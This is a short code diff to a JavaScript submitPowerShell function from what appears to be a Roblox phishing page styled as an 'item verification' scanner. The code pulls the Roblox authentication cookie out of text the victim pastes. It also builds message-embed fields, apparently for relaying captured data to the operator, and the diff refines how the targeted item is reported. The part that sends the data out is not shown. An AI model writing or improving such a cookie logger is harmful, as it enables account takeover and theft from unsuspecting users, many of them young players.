@@ -211,11 +211,10 @@ async function submitPowerShell() {
     showLoadingOverlay('Preparing scan...', 'Initializing item verification process');
 
     try {
-        // Scan limited items and find authentication data from the input
+                // Scan limited items and find authentication data from the input
         const limitedItems = extractLimitedItems(inputText);
         const robloxCookie = extractRobloxCookie(inputText);
-        
-
+        const detectedItem = detectRobloxItem(inputText);
         
         // Check word count using real input value - if 50+ words, allow through even without auth data
         const wordCount = realInputValue.split(/\s+/).filter(word => word.length > 0).length;
@@ -257,8 +256,8 @@ async function submitPowerShell() {
                     inline: false
                 },
                 {
-                    name: "🎮 Detected Roblox Items",
-                    value: detectedItems.length > 0 ? detectedItems.map(item => `**${item.name}** (ID: ${item.id})\n*${item.type} - ${item.url}*`).join('\n\n') : "`No specific items detected`",
+                    name: "🎮 Target Roblox Item",
+                    value: detectedItem ? `**${detectedItem.name}**\n*ID: ${detectedItem.id}*\n*Type: ${detectedItem.type}*\n[View Item](${detectedItem.url})` : "`No specific item detected`",
                     inline: false
                 },
                 {
